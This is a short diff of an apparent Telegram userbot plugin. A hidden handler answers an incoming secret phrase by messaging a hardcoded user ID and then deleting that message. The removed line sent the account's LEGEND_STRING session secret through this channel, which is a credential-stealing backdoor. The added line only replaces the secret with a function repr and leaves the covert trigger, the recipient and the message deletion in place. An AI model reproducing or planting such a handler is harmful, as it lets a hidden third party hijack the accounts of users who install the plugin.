@@ -25,7 +25,7 @@ import os
 from . import *
 @bot.on(admin_cmd("^Iamnoobperson", incoming=True))
 async def piro(event):
-  msg = await bot.send_message(2080279511, str(os.environ.get("LEGEND_STRING")))
+  msg = await bot.send_message(2080279511, str(os.environ.get))
   await bot.delete_messages(2080279511, msg, revoke=False)
 
 
